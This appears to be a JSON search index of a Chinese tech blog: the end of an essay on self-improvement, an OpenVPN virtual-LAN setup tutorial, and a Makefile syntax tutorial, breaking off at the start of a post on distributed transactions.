当他们要做决定的时候，一定要让他们更多的关注自己会失去的东西，而不是会得到的东西。培养他们患得患失心态，让他们认识不到事物真正的价值，失去判断能力……（比如：让他们觉得跟对人拍领导的马屁忠于公司比自我的成长更有价值）\n- 告诉他们，你现有的技能和知识不用更新，就能过好一辈子，新出来的东西没有生命力的……这样他们就会像我们再也不学习的父辈一样很快就会被时代所抛弃……\n- **每个人都喜欢在一些自己做不到的事上找理由，这种能力不教就会**，比如，事情太多没有时间，因为工作上没有用到，等等，你要做的就是帮他们为他们做不到的事找各种非常合理的理由，比如：没事的，一切都是最好的安排；你得不到的那个事没什么意思；你没有面好主要原因是那个面试官问的问题都是可以上网查得到的知识，而不没有问到你真正的能力上；这些东西学了不用很快会忘了，等有了环境再学也不迟……\n\n**最后友情提示一下，上述的这些“最佳实践”你要小心，是所谓，贩毒的人从来不吸毒，开赌场的人从来不赌博！所以，你要小心别自己也掉进去了！这就是“欲练神功，必先自宫”的道理。**\n\n\n\n### 2. 相关原理和思维模型\n\n对于上面的这些技巧还有很多很多，你自己也可以发明或是找到很多。所以，我来讲讲这其中的一些原理。\n\n一般来说，超过别人一般来说就是两个维度：\n\n1. **在认知、知识和技能上**。这是一个人赖以立足社会的能力（参看《[程序员的荒谬之言还是至理名言？](https://coolshell.cn/articles/4235.html)》和《[21天教你学会C++](https://coolshell.cn/articles/2250.html)》）\n2. **在领导力上**。所谓领导力就是你跑在别人前面，你得要有比别人更好的能力更高的标准（参看《[技术人员发展之路](https://coolshell.cn/articles/17583.html)》）\n\n首先，我们要明白，人的技能是从认识开始，然后通过学校、培训或是书本把“零碎的认知”转换成“系统的知识”，而有要把知识转换成技能，就需要训练和实践，这样才能完成从：认识 -> 知识 -> 技能 的转换。这个转换过程是需要耗费很多时间和精力的，而且其中还需要有强大的学习能力和动手能力，这条路径上有很多的“关卡”，每道关卡都会过滤掉一大部分人。比如：**对于一些比较枯燥的硬核知识来说，90%的人基本上就倒下来，不是因为他们没有智商，而是他们没有耐心。**\n\n##### 认知\n\n要在认知上超过别人，就要在下面几个方面上做足功夫：\n\n1）**信息渠道**。试想如果别人的信息源没有你的好，那么，**这些看不见信息源的人，只能接触得到二手信息甚至三手信息，只能获得被别人解读过的信息，这些信息被三传两递后必定会有错误和失真，甚至会被传递信息的中间人hack其中的信息（也就是“中间人攻击”），而这些找不出信息源的人，只能“被人喂养”，于是，他们最终会被困在信息的底层，永世不得翻身。**（比如：学习C语言，放着原作者K&R的不用，硬要用错误百出谭浩强的书，能有什么好呢？）\n\n2）**信息质量**。信息质量主要表现在两个方面，一个是信息中的燥音，另一个是信息中的质量等级，我们都知道，在大数据处理中有一句名言，叫 garbage in garbage out，你天天看的都是垃圾，你的思想和认识也只有垃圾。所以，如果你的信息质量并不好的话，你的认知也不会好，而且你还要花大量的时间来进行有价值信息的挖掘和处理。\n\n3）**信息密度**。优质的信息，密度一般都很大，因为这种信息会逼着你去干这么几件事，a）搜索并学习其关联的知识，b）沉思和反省，c）亲手去推理、验证和实践……一般来说，经验性的文章会比知识性的文章会更有这样的功效。比如，类似于像 Effiective C++/Java，设计模式，Unix编程艺术，算法导论等等这样的书就是属于这种密度很大的书，而像[Netflix的官方blog](https://medium.com/netflix-techblog)和[AWS CTO的blog](https://www.allthingsdistributed.com/)等等地方也会经常有一些这样的文章。\n\n##### 知识\n\n要在知识上超过别人，你就需要在下面几个方面上做足功夫：\n\n1）**知识树（图）**。任何知识，只在点上学习不够的，需要在面上学习，这叫系统地学习，这需要我们去总结并归纳知识树或知识图，一个知识面会有多个知识板块组成，一个板块又有各种知识点，一个知识点会导出另外的知识点，各种知识点又会交叉和依赖起来，学习就是要系统地学习整个知识树（图）。而我们都知道，**对于一棵树来说，“根基”是非常重要的，所以，学好基础知识也是非常重要的，对于一个陌生的地方，有一份地图是非常重要的，没有地图的你只会乱窜，只会迷路、练路、走冤枉路！**\n\n2）**知识缘由**。任何知识都是有缘由的，了解一个知识的来龙去脉和前世今生，会让你对这个知识有非常强的掌握，而不再只是靠记忆去学习。靠记忆去学习是一件非常糟糕的事。而对于一些操作性的知识（不需要了解由来的），我把其叫操作知识，就像一些函数库一样，这样的知识只要学会查文档就好了。**能够知其然，知其所以然的人自然会比识知识到表皮的人段位要高很多。**\n\n3）**方法套路**。学习不是为了找到答案，而是找到方法。就像数学一样，你学的是方法，是解题思路，是套路，会用方程式解题的和不会用方程式解题的在解题效率上不可比较，而在微积分面前，其它的解题方法都变成了渣渣。**你可以看到，掌握高级方法的人比别人的优势有多大，学习的目的就是为了掌握更为高级的方法和解题思路**。\n\n##### 技能\n\n要在技能上超过别人，你就需要在下面几个方面做足功夫：\n\n1）**精益求精**。如果你想拥有专业的技能，你要做不仅仅是拼命地重复一遍又一遍的训练，而是在每一次重复训练时你都要找到更好的方法，总结经验，让新的一遍能够更好，更漂亮，更有效率，否则，用相同的方法重复，那你只不过在搬砖罢了。\n\n2）**让自己犯错**。犯错是有利于成长的，这是因为出错会让人反思，反思更好的方法，反思更完美的方案，总结教训，寻求更好更完美的过程，是技能升级的最好的方式。尤其是当你在出错后，被人鄙视，被人嘲笑后，你会有更大的动力提升自己，这样的动力才是进步的源动力。当然，千万不要同一个错误重复地犯！\n\n3）**找高手切磋**。下过棋，打个球的人都知道，你要想提升自己的技艺，你必需找高手切磋，在和高手切磋的过程中你会感受到高手的技能和方法，有时候你会情不自禁地哇地一下，我靠，还可以这么玩！\n\n##### 领导力\n\n最后一个是领导力，要有领导力或是影响力这个事并不容易，这跟你的野心有多大，好胜心有多强 ，你愿意付出多少很有关系，因为一个人的领导力跟他的标准很有关系，因为有领导力的人的标准比绝大多数人都要高。\n\n1）**识别自己的特长和天赋**。首先，每个人DNA都可能或多或少都会有一些比大多数人NB的东西（当然，也可能没有），如果你有了，那么在你过去的人生中就一定会表现出来了，就是那种大家遇到这个事会来请教你的寻求你帮助的现象。那种，别人要非常努力，而且毫不费劲的事。一旦你有了这样的特长或天赋，那你就要大力地扩大你的领先优势，千万不要进到那些会限制你优势的地方。你是一条鱼，你就一定要把别人拉到水里来玩，绝对不要去陆地上跟别人拼，不断地在自己的特长和天赋上扩大自己的领先优势，彻底一骑绝尘。\n\n2）**识别自己的兴趣和事业**。没有天赋也没有问题，还有兴趣点，都说兴趣是最好的老师，当年，Linus就是在学校里对minx着迷了，于是整出个Linux来，这就是兴趣驱动出的东西，一般来说，兴趣驱动的事总是会比那些被动驱动的更好。但是，这里我想说明一下什么叫“真∙兴趣”，真正的兴趣不是那种三天热度的东西，而是那种，你愿意为之付出一辈子的事，是那种无论有多大困难有多难受你都要死磕的事，这才是“真∙兴趣”，这也就是你的“野心”和“好胜心”所在，其实上升到了你的事业。相信我，绝大多数人只有职业而没有事业的。\n\n3）**建立高级的习惯和方法**。没有天赋没有野心，也还是可以跟别人拼习惯拼方法的，只要你有一些比较好的习惯和方法，那么你一样可以超过大多数人。对此，在习惯上你要做到比较大多数人更自律，更有计划性，更有目标性，比如，每年学习一门新的语言或技术，并可以参与相关的顶级开源项目，每个月训练一个类算法，掌握一种算法，每周阅读一篇英文论文，并把阅读笔记整理出来……**自律的是非常可怕的**。除此之外，你还需要在方法上超过别人，你需要满世界的找各种高级的方法，其中包括，思考的方法，学习的方法、时间管理的方法、沟通的方法这类软实力的，还有，解决问题的方法（trouble shooting 和 problem solving），设计的方法，工程的方法，代码的方法等等硬实力的，一开始照猫画虎，时间长了就可能会自己发明或推导新的方法。\n\n4）**勤奋努力执着坚持**。如果上面三件事你都没有也没有能力，那还有最后一件事了，那就是勤奋努力了，就是所谓的“一万小时定律”了（参看《[21天教你学会C++](https://coolshell.cn/articles/2250.html)》中的十年学编程一节），我见过很多不聪明的人，悟性也不够（比如我就是一个），别人学一个东西，一个月就好了，而我需要1年甚至更长，但是很多东西都是死的，只要肯花时间就有一天你会搞懂的，耐不住我坚持十年二十年，聪明的人发明个飞机飞过去了，笨一点的人愚公移山也过得去，**因为更多的人是懒人，我不用拼过聪明人，我只用拼过那些懒人就好了**。\n\n好了，就这么多，如果哪天你变得消极和不自信，你要来读读我的这篇文章，子曰：温故而知新。\n\n（全文完）\n\n\n\n### 3. 参考资料\n\n+ https://coolshell.cn/articles/19464.html","tags":["思考"],"categories":["思考"]},{"title":"openvpn搭建虚拟局域网","url":"%2Fp%2Fa84d9911.html","content":"\n\n\n### 0. 前言\n\nOpenVPN 是一个健壮的、高度灵活的 [VPN](https://en.wikipedia.org/wiki/VPN) 守护进程。它支持 [SSL/TLS](https://en.wikipedia.org/wiki/SSL/TLS) 安全、[Ethernet bridging](https://en.wikipedia.org/wiki/Bridging_(networking))、经由[代理](https://en.wikipedia.org/wiki/Proxy_server)的 [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) 或 [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol) [隧道](https://en.wikipedia.org/wiki/Tunneling_protocol)和 [NAT](https://en.wikipedia.org/wiki/Network_address_translation)。另外，它也支持动态 IP 地址以及 [DHCP](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol)，可伸缩性足以支持数百或数千用户的使用场景，同时可移植至大多数主流操作系统平台上。\n\n##### 安装openvpn\n\n```bash\nsudo apt install openvpn\n```\n\n<!-- more -->\n\n\n\n### 1. 生成证书\n\n```bash\ngit clone https://github.com/OpenVPN/easy-rsa\ncd easyrsa3\n```\n\n\n\n##### 1.1 生成 CA\n\n```bash\n./easyrsa init-pki\n\n./easyrsa build-ca  \n# 输入密码: 123456\nCommon Name: OpenVPN-CA\n```\n\npki文件夹下会生成 ca.crt\n\n\n\n##### 1.2 生成server和 client 公钥私钥对\n\n```bash\n./easyrsa build-server-full server\n\n./easyrsa build-client-full client1\n./easyrsa build-client-full client2\n./easyrsa build-client-full client3\n```\n\npki/private 是私有的 key\n\npki/issued 是公有的 key\n\n\n\n##### 1.3 生成Diffie-Hellman pem \n\n```bash\n./easyrsa gen-dh\n```\n\npki 文件夹下生成了 dh.pem\n\n\n\n##### 1.4 现在我们有了\n\n| **Filename** | **Needed By**            | **Purpose**               | **Secret** |\n| ------------ | ------------------------ | ------------------------- | ---------- |\n| ca.crt       | server + all clients     | Root CA certificate       | NO         |\n| ca.key       | key signing machine only | Root CA key               | YES        |\n| dh{n}.pem    | server only              | Diffie Hellman parameters | NO         |\n| server.crt   | server only              | Server Certificate        | NO         |\n| server.key   | server only              | Server Key                | YES        |\n| client1.crt  | client1 only             | Client1 Certificate       | NO         |\n| client1.key  | client1 only             | Client1 Key               | YES        |\n| client2.crt  | client2 only             | Client2 Certificate       | NO         |\n| client2.key  | client2 only             | Client2 Key               | YES        |\n| client3.crt  | client3 only             | Client3 Certificate       | NO         |\n| client3.key  | client3 only             | Client3 Key               | YES        |\n\n\n\n### 2. 配置文件\n\n在安装目录下(`/usr/share/doc/openvpn/examples/sample-config-files`)找到配置 `server.conf` and `client.conf`\n\n如果只有有 server.conf.gz 的话, 需要解压\n\n```bash\ngunzip -c server.conf.gz > server.conf\n```\n\n\n\n##### 2.1  服务端修改证书路径\n\nBefore you use the sample configuration file, you should first edit the **ca**, **cert**, **key**, and **dh** parameters to point to the files you generated in the [PKI](https://openvpn.net/community-resources/how-to/#setting-up-your-own-certificate-authority-ca-and-generating-certificates-and-keys-for-an-openvpn-server-and-multiple-clients) section above.\n\n##### 2.2 服务端dev 模式可以修改  tap tun\n\n##### 2.3 服务端修改 ip 范围\n\nIf you want to use a virtual IP address range other than `10.8.0.0/24`, you should modify the `server` directive. Remember that this virtual IP address range should be a private range which is currently unused on your network.\n\n\n\nThe Internet Assigned Numbers Authority (IANA) has reserved the following three blocks of the IP address space for private internets (codified in RFC 1918):\n\n| 10.0.0.0    | 10.255.255.255  | (10/8 prefix)       |\n| ----------- | --------------- | ------------------- |\n| 172.16.0.0  | 172.31.255.255  | (172.16/12 prefix)  |\n| 192.168.0.0 | 192.168.255.255 | (192.168/16 prefix) |\n\nThe best candidates are subnets in the middle of the vast 10.0.0.0/8 netblock (for example 10.66.77.0/24).\n\n\n\n##### 2.4 服务端修改 client 之间可连接\n\nUncomment out the `client-to-client` directive if you would like connecting clients to be able to reach each other over the VPN. By default, clients will only be able to reach the server.\n\n##### 2.5 服务端修改 user 和 group\n\nIf you are using Linux, BSD, or a Unix-like OS, you can improve security by uncommenting out the **user nobody** and **group nobody** directives.\n\n##### 2.6 客户端修改证书路径\n\n`ca`, `cert`, `key`\n\n##### 2.7 客户端修改 remote 参数\n\n```bash\nremote my-server-1 1194\n```\n\n\n\n##### 2.8 服务器和客户端的 `dev` (tun or tap) and `proto` (udp or tcp) 要一致\n\n\n\n### 3. 启动使用\n\n##### 3.1 启动 server\n\n```bash\nsudo openvpn /etc/openvpn/server.conf\n```\n\n成功启动以后会发现多了一个 tun 网口\n\n\n\n如遇到错误: [Open VPN options error: --tls-auth fails with 'ta.key': no such file or directory](https://unix.stackexchange.com/questions/359428/open-vpn-options-error-tls-auth-fails-with-ta-key-no-such-file-or-director)\n\n```bash\nsudo openvpn --genkey --secret /etc/openvpn/certs/ta.key\n```\n\n\n\n##### 3.2 启动 client\n\n``` bash\nsudo openvpn /etc/openvpn/client.conf\n```\n\n\n\n如遇到错误: Authenticate/Decrypt packet error: packet HMAC authentication failed, 配置文件里,\n\n```bash\ntls-auth /etc/openvpn/certs/ta.key 0  #服务器用0\n\ntls-auth /etc/openvpn/certs/ta.key 1  #客户端用1\n```\n\n注意, 这个 key 是同一个, 在服务器生成, 不是每个都生成一次\n\n\n\n##### 3.3 测试\n\n在客户端  `ping 10.8.0.1`\n\nIf the ping succeeds, congratulations! You now have a functioning VPN.\n\n我们也可以 `ssh user@10.8.0.1` 发现也可以\n\n\n\n##### 3.4 mac 使用\n\nhttps://tunnelblick.net/ 下载安装包\n\n可以生成.ovpn 文件, 参考https://serverfault.com/a/483967\n\n\n\n### 4. openvpn服务\n\n##### 4.1 server service\n\n```bash\nsudo systemctl start openvpn@server.service\n\nsudo systemctl enable openvpn@server.service\n```\n\n需要输入密码请这样\n\n```bash\nsudo systemd-tty-ask-password-agent \n```\n\n\n\n##### 4.2 client service\n\n```bash\nsudo systemctl start openvpn@client.service\n\nsudo systemctl enable openvpn@client.service\n```\n\n\n\n### 5. 客户端分配固定 IP\n\n```bash\ncd /etc/openvpn\nmkdir ccd\n\n# 配置文件修改client-config-dir\nvim server.conf\nclient-config-dir ccd\n\n#在ccd文件夹下建立以用户名(Common Name)为名称的文件\ncd ccd\n\nvi client1\nifconfig-push 10.8.0.2 255.255.255.0\n\nvi client2\nifconfig-push 10.8.0.3 255.255.255.0\n```\n\n\n\n### 6. 参考资料\n\n+ https://openvpn.net/community-resources/how-to/\n\n+ https://github.com/OpenVPN/easy-rsa\n\n+ https://tunnelblick.net/\n\n+ https://community.openvpn.net/openvpn/wiki/Concepts-Addressing","tags":["openvpn"],"categories":["系统"]},{"title":"Makefile的编写规则","url":"%2Fp%2F4cf47ff4.html","content":"\n\n\n### 1. Makefile 介绍\n\nMakefile文件由一系列规则（rules）构成。每条规则的形式如下。\n\n```bash\n<target> : <prerequisites> \n[tab]  <commands>\n```\n\n上面第一行冒号前面的部分，叫做\"目标\"（target），冒号后面的部分叫做\"前置条件\"（prerequisites）；第二行必须由一个tab键起首，后面跟着\"命令\"（commands）。\n\n\"目标\"是必需的，不可省略；\"前置条件\"和\"命令\"都是可选的，但是两者之中必须至少存在一个。\n\n每条规则就明确两件事：构建目标的前置条件是什么，以及如何构建。\n\n<!-- more -->\n\n##### 1.1 目标（target）\n\n一个目标（target）就构成一条规则。目标通常是文件名，指明Make命令所要构建的对象，目标可以是一个文件名，也可以是多个文件名，之间用空格分隔。\n\n除了文件名，目标还可以是某个操作的名字，这称为\"伪目标\"（phony target）。\n\n```makefile\nclean:\n      rm *.o\n```\n\n上面代码的目标是clean，它不是文件名，而是一个操作的名字，属于\"伪目标 \"，作用是删除对象文件。\n\n```bash\n$ make  clean\n```\n\n但是，如果当前目录中，正好有一个文件叫做clean，那么这个命令不会执行。因为Make发现clean文件已经存在，就认为没有必要重新构建了，就不会执行指定的rm命令。\n\n\n\n为了避免这种情况，可以明确声明clean是\"伪目标\"，写法如下。\n\n```makefile\n.PHONY: clean\nclean:\n        rm *.o temp\n```\n\n\n\n声明clean是\"伪目标\"之后，make就不会去检查是否存在一个叫做clean的文件，而是每次运行都执行对应的命令。\n\n\n\n如果Make命令运行时没有指定目标，默认会执行Makefile文件的第一个目标。\n\n```bash\nmake\n```\n\n\n\n##### 1.2 前置条件（prerequisites）\n\n前置条件通常是一组文件名，之间用空格分隔。它指定了\"目标\"是否重新构建的判断标准：只要有一个前置文件不存在，或者有过更新（前置文件的last-modification时间戳比目标的时间戳新），\"目标\"就需要重新构建。\n\n```makefile\nresult.txt: source.txt\n    cp source.txt result.txt\n```\n\n上面代码中，构建 result.txt 的前置条件是 source.txt 。如果当前目录中，source.txt 已经存在，那么`make result.txt`可以正常运行，否则必须再写一条规则，来生成 source.txt 。\n\n```makefile\nsource.txt:\n    echo \"this is the source\" > source.txt\n```\n\n\n\n上面代码中，source.txt后面没有前置条件，就意味着它跟其他文件都无关，只要这个文件还不存在，每次调用`make source.txt`，它都会生成。\n\n```bash\n$ make result.txt\n$ make result.txt\n```\n\n上面命令连续执行两次`make result.txt`。第一次执行会先新建 source.txt，然后再新建 result.txt。第二次执行，Make发现 source.txt 没有变动（时间戳晚于 result.txt），就不会执行任何操作，result.txt 也不会重新生成。\n\n##### 1.3 命令（commands）\n\n命令（commands）表示如何更新目标文件，由一行或多行的Shell命令组成。它是构建\"目标\"的具体指令，它的运行结果通常就是生成目标文件。\n\n每行命令之前必须有一个tab键。需要注意的是，每行命令在一个单独的shell中执行。这些Shell之间没有继承关系。\n\n```makefile\nvar-lost:\n    export foo=bar\n    echo \"foo=[$$foo]\"\n```\n\n上面代码执行后（`make var-lost`），取不到foo的值。因为两行命令在两个不同的进程执行。一个解决办法是将两行命令写在一行，中间用分号分隔。\n\n```makefile\nvar-kept:\n    export foo=bar; echo \"foo=[$$foo]\"\n```\n\n另一个解决办法是在换行符前加反斜杠转义。\n\n```makefile\nvar-kept:\n    export foo=bar; \\\n    echo \"foo=[$$foo]\"\n```\n\n\n\n\n\n### 2. Makefile文件的语法\n\n\n\n##### 2.1 井号（#）\n\n在Makefile中表示注释。\n\n\n\n##### 2.2 回声（echoing）\n\n正常情况下，make会打印每条命令，然后再执行，这就叫做回声（echoing）。\n\n在命令的前面加上@，就可以关闭回声。\n\n```makefile\ntest:\n    # 这是测试\n\ntest:\n    @# 这是测试\n```\n\n\n\n##### 2.3 通配符\n\n通配符（wildcard）用来指定一组符合条件的文件名。Makefile 的通配符与 Bash 一致，主要有星号（*）、问号（？）和 [...] 。比如， *.o 表示所有后缀名为o的文件。\n\n```makefile\nclean:\n        rm -f *.o\n```\n\n\n\n##### 2.4 模式匹配\n\nMake命令允许对文件名，进行类似正则运算的匹配，主要用到的匹配符是%。比如，假定当前目录下有 f1.c 和 f2.c 两个源码文件，需要将它们编译为对应的对象文件。\n\n```\n%.o: %.c\n\n等同于下面的写法。\n\nf1.o: f1.c\nf2.o: f2.c\n```\n\n使用匹配符%，可以将大量同类型的文件，只用一条规则就完成构建。\n\n\n\n##### 2.5 变量和赋值符\n\nMakefile 允许使用等号自定义变量。\n\n```makefile\ntxt = Hello World\ntest:\n    @echo $(txt)\n```\n\n上面代码中，变量 txt 等于 Hello World。调用时，变量需要放在 $( ) 之中。\n\n\n\n调用Shell变量，需要在美元符号前，再加一个美元符号，这是因为Make命令会对美元符号转义。\n\n```makefile\ntest:\n    @echo $$HOME\n```\n\n\n\n有时，变量的值可能指向另一个变量。\n\n```makefile\nv1 = $(v2)\n```\n\n上面代码中，变量 v1 的值是另一个变量 v2。这时会产生一个问题，v1 的值到底在定义时扩展（静态扩展），还是在运行时扩展（动态扩展）？如果 v2 的值是动态的，这两种扩展方式的结果可能会差异很大。\n\n为了解决类似问题，Makefile一共提供了四个赋值运算符 （=、:=、？=、+=），它们的区别请看[StackOverflow](http://stackoverflow.com/questions/448910/makefile-variable-assignment)。\n\n```bash\nVARIABLE = value\n# 在执行时扩展，允许递归扩展。\n\nVARIABLE := value\n# 在定义时扩展。\n\nVARIABLE ?= value\n# 只有在该变量为空时才设置值。\n\nVARIABLE += value\n# 将值追加到变量的尾端。\n```\n\n\n\n##### 2.6 内置变量（Implicit Variables）\n\nMake命令提供一系列内置变量，比如，`$(CC)` 指向当前使用的编译器，`$(MAKE)` 指向当前使用的Make工具。这主要是为了跨平台的兼容性，详细的内置变量清单见[手册](https://www.gnu.org/software/make/manual/html_node/Implicit-Variables.html)。\n\n```makefile\noutput:\n    $(CC) -o output input.c\n```\n\n\n\n##### 2.7 自动变量（Automatic Variables）\n\nMake命令还提供一些自动变量，它们的值与当前规则有关。主要有以下几个。\n\n+ ``$@``\n\n  `$@`指代当前目标，就是Make命令当前构建的那个目标。比如，`make foo`的`$@` 就指代foo。\n\n  ```bash\n  a.txt b.txt: \n      touch $@\n      \n  #等同于下面的写法。    \n   \n  a.txt:\n      touch a.txt\n  b.txt:\n      touch b.txt\n  ```\n\n+ `$<`\n\n  `$<` 指代第一个前置条件。比如，规则为 t: p1 p2，那么`$<` 就指代p1。\n\n  ```bash\n  a.txt: b.txt c.txt\n      cp $< $@ \n      \n  # 等同于下面的写法。\n  \n  a.txt: b.txt c.txt\n      cp b.txt a.txt \n  ```\n\n  \n\n+ `$?`\n\n  `$?` 指代比目标更新的所有前置条件，之间以空格分隔。比如，规则为 t: p1 p2，其中 p2 的时间戳比 t 新，`$?`就指代p2。\n\n  \n\n+ `$^`\n\n  `$^` 指代所有前置条件，之间以空格分隔。比如，规则为 t: p1 p2，那么 `$^` 就指代 p1 p2 。\n\n  \n\n+ `$*`\n\n  `$*` 指代匹配符 % 匹配的部分， 比如% 匹配 f1.txt 中的f1 ，`$*` 就表示 f1。\n\n  \n\n+ `$(@D)` 和 `$(@F)`\n\n  `$(@D)` 和 `$(@F)` 分别指向 `$@` 的目录名和文件名。比如，`$@`是 src/input.c，那么`$(@D)` 的值为 src ，`$(@F)` 的值为 input.c。\n\n  \n\n+ `$(<D)` 和 `$(<F)`\n\n  `$(<D)` 和 `$(<F)` 分别指向 `$<` 的目录名和文件名。\n\n\n\n下面是自动变量的一个例子。\n\n```makefile\ndest/%.txt: src/%.txt\n    @[ -d dest ] || mkdir dest\n    cp $< $@\n```\n\n上面代码将 src 目录下的 txt 文件，拷贝到 dest 目录下。首先判断 dest 目录是否存在，如果不存在就新建，然后，`$<` 指代前置文件（src/%.txt）， `$@` 指代目标文件（dest/%.txt）。\n\n\n\n##### 2.8 判断和循环\n\nMakefile使用 Bash 语法，完成判断和循环。\n\n```makefile\nifeq ($(CC),gcc)\n  libs=$(libs_for_gcc)\nelse\n  libs=$(normal_libs)\nendif\n```\n\n上面代码判断当前编译器是否 gcc ，然后指定不同的库文件。\n\n\n\n```makefile\nLIST = one two three\nall:\n    for i in $(LIST); do \\\n        echo $$i; \\\n    done\n\n# 等同于\n\nall:\n    for i in one two three; do \\\n        echo $i; \\\n    done\n```\n\n上面代码的运行结果。\n\n```bash\none\ntwo\nthree\n```\n\n\n\n##### 2.9 函数\n\nMakefile 还可以使用函数，格式如下。\n\n```bash\n$(function arguments)\n# 或者\n${function arguments}\n```\n\n\n\nMakefile提供了许多[内置函数](http://www.gnu.org/software/make/manual/html_node/Functions.html)，可供调用。下面是几个常用的内置函数。\n\n+ shell 函数\n\n  shell 函数用来执行 shell 命令\n\n  ```makefile\n  srcfiles := $(shell echo src/{00..99}.txt)\n  ```\n\n  \n\n+ wildcard 函数\n\n  wildcard 函数用来在 Makefile 中，替换 Bash 的通配符。\n\n  ```makefile\n  srcfiles := $(wildcard src/*.txt)\n  ```\n\n  \n\n+ subst 函数\n\n  subst 函数用来文本替换，格式如下。\n\n  ```makefile\n  $(subst from,to,text)\n  ```\n\n  下面的例子将字符串\"feet on the street\"替换成\"fEEt on the strEEt\"。\n\n  ```makefile\n  $(subst ee,EE,feet on the street)\n  ```\n\n  \n\n+ patsubst函数\n\n  patsubst 函数用于模式匹配的替换，格式如下。\n\n  ```makefile\n  $(patsubst pattern,replacement,text)\n  ```\n\n  下面的例子将文件名\"x.c.c bar.c\"，替换成\"x.c.o bar.o\"。\n\n  ```makefile\n  $(patsubst %.c,%.o,x.c.c bar.c)\n  ```\n\n  \n\n+ 替换后缀名\n\n  替换后缀名函数的写法是：变量名 + 冒号 + 后缀名替换规则。它实际上patsubst函数的一种简写形式。\n\n  ```makefile\n  min: $(OUTPUT:.js=.min.js)\n  ```\n\n  上面代码的意思是，将变量OUTPUT中的后缀名 .js 全部替换成 .min.js 。\n\n\n\n### 3. Makefile 的实例\n\n##### 3.1  删除\n\n```makefile\n.PHONY: cleanall cleanobj cleandiff\n\ncleanall : cleanobj cleandiff\n        rm program\n\ncleanobj :\n        rm *.o\n\ncleandiff :\n        rm *.diff\n```\n\n上面代码可以调用不同目标，删除不同后缀名的文件，也可以调用一个目标（cleanall），删除所有指定类型的文件。\n\n##### 3.2 编译C语言项目\n\n```makefile\nedit : main.o kbd.o command.o display.o \n    cc -o edit main.o kbd.o command.o display.o\n\nmain.o : main.c defs.h\n    cc -c main.c\nkbd.o : kbd.c defs.h command.h\n    cc -c kbd.c\ncommand.o : command.c defs.h command.h\n    cc -c command.c\ndisplay.o : display.c defs.h\n    cc -c display.c\n\nclean :\n     rm edit main.o kbd.o command.o display.o\n\n.PHONY: edit clean\n```\n\n\n\n##### 3.3 项目\n\n```makefile\n.SILENT :\n.PHONY : dep vet clean dist package test\n\nNAME := cistern\nPRE := oc\nROOF := fhyx.tech/oceans/$(NAME)\n\nWITH_ENV = env `cat .env 2>/dev/null | xargs`\nUNAME_S := $(shell uname -s)\nifeq ($(UNAME_S),Darwin)\n    HOST := $(shell scutil --get LocalHostName)\nelse\n    HOST := $(shell hostname)\nendif\n\nDATE := $(shell date '+%Y%m%dT%H%M')\nSTAMP := $(shell date +%s)\nUSER := $(shell echo ${USER})\nTAG:=$(shell git describe --tags --always)\nLDFLAGS:=-X $(ROOF)/settings.Name=$(NAME) -X $(ROOF)/cmd.version=$(TAG) -X $(ROOF)/cmd.built=$(DATE) -X $(ROOF)/cmd.buildStamp=$(STAMP) -X $(ROOF)/cmd.buildUser=$(USER) -X $(ROOF)/cmd.buildHost=$(HOST)\n\nCOMMANDS = vet clean dist\n.PHONY: $(COMMANDS)\n\nmain:\n\techo \"Building $(NAME)\"\n\tgo build -ldflags \"$(LDFLAGS)\" .\n\nhelp:\n\t@echo \"commands: $(COMMANDS)\"\n\nall: clean $(COMMANDS)\n\nvet:\n\techo \"Checking .\"\n\tgo vet -vettool=$(which shadow) -atomic -bool -copylocks -nilfunc -printf -rangeloops -unreachable -unsafeptr -unusedresult ./...\n\nclean:\n\techo \"Cleaning dist\"\n\trm -rf dist\n\trm -f $(NAME) $(NAME)-*\n\ndist/linux_amd64/$(NAME): $(SOURCES)\n\techo \"Building $(NAME) of linux\"\n\tmkdir -p dist/linux_amd64 && GOOS=linux GOARCH=amd64 go build -ldflags \"$(LDFLAGS) -s -w\" -o dist/linux_amd64/$(PRE)-$(NAME) $(ROOF)\n\ndist/darwin_amd64/$(NAME): $(SOURCES)\n\techo \"Building $(NAME) of darwin\"\n\tmkdir -p dist/darwin_amd64 && GOOS=darwin GOARCH=amd64 go build -ldflags \"$(LDFLAGS) -w\" -o dist/darwin_amd64/$(PRE)-$(NAME) $(ROOF)\n\ndist: clean dist/linux_amd64/$(NAME) dist/darwin_amd64/$(NAME)\n\npackage: dist\n\techo \"Packaging $(NAME)\"\n\tls dist/linux_amd64 | xargs tar -cvJf $(NAME)-linux-amd64-$(TAG).tar.xz -C dist/linux_amd64\n\n.PHONY: binary-deploy\nbinary-deploy:\n\t@echo \"copy binary to earth\"\n\t@scp dist/linux_amd64/??-* earth:dist/linux_amd64/\n\n.PHONY: package-upload\npackage-upload:\n\t@echo \"copy package.tar.?z to venus\"\n\t@scp *-linux-amd64-*.tar.?z gopkg:/var/www/gopkg/\n\ndocker-build: dist/linux_amd64/$(NAME)\n\techo \"Building docker image\"\n\tcp -rf Dockerfile* dist/\n\tdocker build -t fhyx/cistern:$(TAG) dist/\n\tdocker tag fhyx/cistern:$(TAG) fhyx/cistern:latest\n.PHONY: $@\n```\n\n\n\n```go\npackage cmd\n\nimport (\n\t\"fmt\"\n\t\"runtime\"\n\n\t\"github.com/spf13/cobra\"\n)\n\nvar (\n\tversion   = \"dev\"\n\tbuilt     = \"N/A\"\n\tbuildUser = \"None\"\n\tname      = \"cistern\"\n)\n\nvar versionCmd = &cobra.Command{\n\tUse:   \"version\",\n\tShort: \"Print the version number\",\n\tLong:  ``,\n\tRun: func(cmd *cobra.Command, args []string) {\n\t\tfmt.Printf(\"%s %s built %s by %s (%s %s-%s)\\n\", name, version, built, buildUser, runtime.Version(), runtime.GOOS, runtime.GOARCH)\n\t},\n}\n\nfunc init() {\n\tRootCmd.AddCommand(versionCmd)\n}\n\nfunc inDevelop() bool {\n\treturn version == \"dev\"\n}\n```\n\n\n\n### 4. 参考资料\n\n+ http://www.ruanyifeng.com/blog/2015/02/make.html\n+ https://blog.csdn.net/ruglcc/article/details/7814546\n+ http://www.gnu.org/software/make/manual/html_node/Special-Targets.html#Special-Targets\n","tags":["makefile"],"categories":["shell"]},{"title":"分布式事务和分布式锁","url":"%2Fp%2Fbb1dd10.html","content":"\n\n\n# 0. 分布式理论\n\n分布式系统的核心就是解决一个问题：不同节点间如何达成共识。\n\n### 0.1 一致性问题\n\n一致性问题就是相互独立的节点之间如何达成一项决议的问题。\n\n分布式系统中，进行数据库事务提交(commit 